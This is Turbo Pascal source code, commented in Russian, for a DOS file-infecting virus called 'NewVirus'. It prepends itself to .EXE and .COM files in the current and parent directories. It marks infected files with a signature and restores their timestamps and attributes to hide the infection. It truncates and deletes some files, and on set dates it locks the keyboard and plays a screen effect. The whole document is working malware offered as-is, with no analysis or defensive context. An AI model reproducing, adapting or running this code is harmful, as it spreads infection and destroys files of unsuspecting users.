{$A-,B-,D-,E-,F-,G+,I-,L-,N-,O-,P-,Q-,R-,S-,T-,V-,X+,Y-}
{$M 7000,0,65536}
PROGRAM NewVirus;

{$I-}

USES CRT, DOS;

TYPE
    String12 = String [12];

VAR
   FName         : String12;      {Имя запускаемого файла}
   Command       : String [80];   {Блок параметров}
   OldAttrib     : Word;          {Атрибуты файла}
   F1, F2, F3    : File;          {Переменные связи}
   FlagError     : Boolean;       {Флаг ошибки}
   P             : Pointer;       {Указатель для перетаскивания блоков}
   SR            : SearchRec;     {Запись для поиска файлов}
   EC, EK        : Word;          {Результаты копирования блоков}
   FDateTime     : LongInt;       {Дата и время файла}
   Year, Month, day, DW : Word;   {Для критерия вызова эффекта}
   Home          : String;        {Путь запуска вируса}
   PATH          : String;        {Путь поиска жертв}
   Dir           : DirStr;        {Путь к файлу}
   Nam           : NameStr;       {Имя файла без расширения}
   Ext           : ExtStr;        {Расширение файла}

CONST
     VirBlockName = '_$_.$';  {Имя блока, содержащего код вируса}
     VirFilesName = '_$$_.$';  {Имя файла при запуске, содержащего вирус}
     IDENTIFER    = '@@@@';       {Строка-идентификатор зараженности}
     VirBlockLen  = 7639;         {Размер вируса в байтах}
     Buffer        : Array [1..4] OF Byte=
                   ($40, $40, $40, $40); {буфер}
     IDENTIFER_B   : Array [1..4] OF Byte=
                   ($0, $0, $0, $0); {буфер}
     My_Ident     = '░▒▓█ Error free █▓▒░'; {Прикольчик}
     Autor : Array [1..15] of Byte =
                   (Ord ('-') xor $0d, Ord ('=') xor $0d, Ord ('*') xor $0d, Ord (' ') xor $0d,
                    Ord ('R') xor $0d, Ord ('e') xor $0d, Ord ('d') xor $0d, Ord (' ') xor $0d,
                    Ord ('A') xor $0d, Ord ('r') xor $0d, Ord ('c') xor $0d, Ord (' ') xor $0d,
                    Ord ('*') xor $0d, Ord ('=') xor $0d, Ord ('-') xor $0d);    {Ну а это я}

function UpChar (c : Char) : Char;
begin
 case c of
  'a'..'z':UpChar:=chr(ord(c)-97+65);
 { 'а'..'п':UpChar:=chr(ord(c)-160+128);
  'р'..'я':UpChar:=chr(ord(c)-224+144);}
   else UpChar:=c;
 end;
end;

function upstr (S : String) : String;
var i:byte;
begin
 for i:=1 to byte(s[0]) do s[i]:=upchar(s[i]);
 upstr:=s;
end;

{Запуск на исполнение файла}
PROCEDURE Exec_File;
BEGIN
    SwapVectors;
    Exec(FName, Command);
    SwapVectors;
END;

{Подготовка перед запуском файла}
PROCEDURE Prepare_For_Exec;
procedure ErrorExit;
begin
        FlagError := True;
        Close (F1);
        Close (F2);
        Erase (F2);
        Rename (F1, FName);
        {Dispose (P);}
        FreeMem (P, 65535);
end;
BEGIN
     Assign (F1, FName);
     GetFAttr (F1, OldAttrib);
     SetFAttr (F1, Archive);
     Rename (F1, VirFilesName);
     Assign (F1, VirFilesName);
     Assign (F2, VirBlockName);
     FileMode := 2;
     ReSet (F1, 1);
     IF IOResult <> 0 THEN BEGIN
        FlagError := True;
        Exit;
     END;
     GetFTime (F1, FDateTime);
     ReWrite (F2, 1);
     {New (P);}
     GetMem (P, 65535);
     BlockRead (F1, P^, VirBlockLen, EC);
     IF EC <> VirBlockLen THEN BEGIN
        ErrorExit;
        Exit;
     END;
     BlockWrite (F2, P^, VirBlockLen, EC);
     IF EC <> VirBlockLen THEN BEGIN
        ErrorExit;
        Exit;
     END;
     Close (F2);
     Assign (F2, FName);
     ReWrite (F2, 1);
     While EOF (F1) = False DO BEGIN
           BlockRead (F1, P^, 65535, EC);
           BlockWrite (F2, P^,EC, EK);
     END;
     Close (F1);
     Seek (F2, FileSize (F2) - 4);
     Truncate (F2);
     SetFTime (F2, FDateTime);
     Close (F2);
     Exec_File;
     Erase (F2);
     Rename (F1, FName);
     SetFAttr (F1, OldAttrib);
     Assign (F2, VirBlockName);
     ReSet (F2, 1);
     BlockRead (F2, P^, VirBlockLen, EC);
     IF VirBlockLen <> EC THEN FlagError := True;
     Close (F2);
END;

{Процедура эффекта}
PROCEDURE EFFECT; assembler;
ASM
                cli
                mov al,0adh
                out 64h,al
                jmp @@KeyLock_1
                @@KeyLock_1:
                sti
                mov     ax,13h
                int     10h
                mov     cx, 3Fh
                mov     bh, 1
                mov     dx, 3C8h
@@loop_1:
                mov     al, ch
                out     dx, al
                inc     dx
                mov     al, cl
                shr     al, 1
                out     dx, al
                mov     al, ch
                and     al, 3
                shl     al, 2
                out     dx, al
                mov     al, ch
                and     al, 7
                shl     al, 1
                add     al, al
                out     dx, al
                test    ch, 40h
                jz      @@a001
                sub     cl,2
@@a001:
                inc     cl
                dec     dx
                inc     ch
                dec     bx
                jnz     @@loop_1
                mov     dx, 0A000h
                mov     es, dx
                mov     ds, dx
                mov     cx, 7D00h
                mov     ax, 0FFFFh
                rep stosw
                mov     bx,0FFFFh{30}
@@lp_effect:
                xor     ah, ah
                add     al, [di]
                adc     ah, dl
                add     al, [di+282h]
                adc     ah, dl
                add     al, [di+27Fh]
                adc     ah, dl
                shr     ax, 2
                dec     al
                mov     ah, al
                add     ah, 4
                stosw
                add     di, 13Eh
                xchg    ah, al
                stosw
                test    di, 3Fh
                jz      @@lp_effect
                sub     di, 140h
                loop    @@lp_effect
                dec     bx
                jnz     @@lp_effect
                mov     ax,3
                int     10h
                cli
                mov al,0aeh
                out 64h,al
                jmp @@KeyLock_2
                @@KeyLock_2:
                sti
END;

{Инфицирование указанного файла}
PROCEDURE Infector (F_Name : String12);
BEGIN
     Assign (F1, VirFilesName);
     ReWrite (F1, 1);
     BlockWrite (F1, P^, VirBlockLen, EC);
     Close (F1);
     Command := '/c copy /b ' + VirFilesName + ' + ' + F_Name +
                ' ' + IDENTIFER + '.$ >nul';
     SwapVectors;
     Exec(GetEnv('COMSPEC'), Command);
     SwapVectors;
     Erase (F1);
     Assign (F2, F_Name);
     GetFAttr (F2, OldAttrib);
     ReSet (F2, 1);
     GetFTime (F1, FDateTime);
     Close (F2);
     SetFAttr (F2, Archive);
     Erase (F2);
     Assign (F1, IDENTIFER + '.$');
     Rename (F1, F_Name);
     Assign (F1, F_Name);
     FileMode := 2;
     ReSet (F1, 1);
     Seek (F1, FileSize (F1));
     BlockWrite (F1, Buffer, 4, EC);
     Close (F1);
     SetFAttr (F1, OldAttrib);
     FileMode := 0;
     ReSet (F1, 1);
     SetFTime (F1, FDateTime);
     Close (F1);
END;

{Завершение инфицирования файлов и вызов эффекта}
PROCEDURE End_Of_Infect;
BEGIN
     Assign (F3, VirBlockName);
     Erase (F3);
     {Dispose (P);} FreeMem (P, 65535);
     GetDate (Year, Month, Day, DW);
     IF (Month = Day) AND (DW = Day) THEN BEGIN
        GetTime (Year, Month, Day, DW);
        IF (Year = Month) THEN BEGIN
           EFFECT;
           WriteLn (My_Ident);
        END;
     END;
END;

{Уничтожение файлов}
PROCEDURE Killer_File (NAME : String12);
BEGIN
     Assign (F3, NAME);
     SetFAttr (F3, Archive);
     FileMode := 2;
     ReSet (F3, 1);
     Truncate (F3);
     Close (F3);
     Erase (F3);
END;

{Обработка имени файла и проверка на инфицирование}
PROCEDURE FileTest (S : String12);
BEGIN
     PATH := FExpand(S);
     FSplit (PATH, Dir, Nam, Ext);
     Ext := UpStr(Ext);
     IF Pos ('░', EXT) > 0 THEN BEGIN
        Killer_File (S);
        Exit;
     END;
     IF (Ext <> '.EXE') AND (Ext <> '.COM') THEN Exit;
     Assign (F3, S);
     ReSet (F3, 1);
     IF (Ext = '.COM') THEN BEGIN
        IF FileSize (F3) + VirBlockLen > 65530 THEN BEGIN
           Close (F3);
           Exit;
        END;
        IF UpStr (Nam) = 'COMMAND' THEN BEGIN
           Close (F3);
           Exit;
        END;
     END;
     Seek (F3, FileSize (F3) - 4);
     BlockRead (F3, IDENTIFER_B, 4, EC);
     Close (F3);
     IF EC <> 4 THEN Exit;
     IF (Buffer[1] <> IDENTIFER_B [1]) OR
        (Buffer[2] <> IDENTIFER_B [2]) OR
        (Buffer[3] <> IDENTIFER_B [3]) OR
        (Buffer[4] <> IDENTIFER_B [4]) THEN Infector (S);
END;

{Поиск в текущем каталоге}
PROCEDURE Find_Current (MASK : String; ATT : Word);
VAR
   SR : SearchRec;
BEGIN
    FindFirst(MASK, ATT, SR);
    while DosError = 0 do
    begin
      FileTest (SR.Name);
      FindNext(SR);
    end;
END;

{Поиск каталогов}
FUNCTION Find_PATH : Boolean;
VAR
   SR : SearchRec;
BEGIN
    FindFirst('..', Directory, SR);
    IF DosError <> 0 THEN BEGIN
       Find_PATH := True;
       Exit;
    END;
    ChDir ('..');
    Find_PATH := False;
END;

BEGIN
     Command := '';
     FOR EC := 1 TO ParamCount DO
         Command := Command + ParamStr (EC) + ' ';
     Delete (Command, Length (Command), 1);
     FlagError := False;
     Home := ParamStr (0);
     FSplit (Home, Dir, Nam, Ext);
     Home := Dir;
     Delete (Home, Length (Home), 1);
     FName := Nam + Ext;
     Prepare_For_Exec;
     {IF FlagError THEN EXIT;}
     repeat
           Find_Current ('*.*', AnyFile);
     until Find_PATH;
     End_Of_Infect;
     ChDir ('\');
     Find_Current ('*.░░░', AnyFile);
     ChDir (Home);
     Assign (F3, VirBlockName);
     Erase (F3);
END.
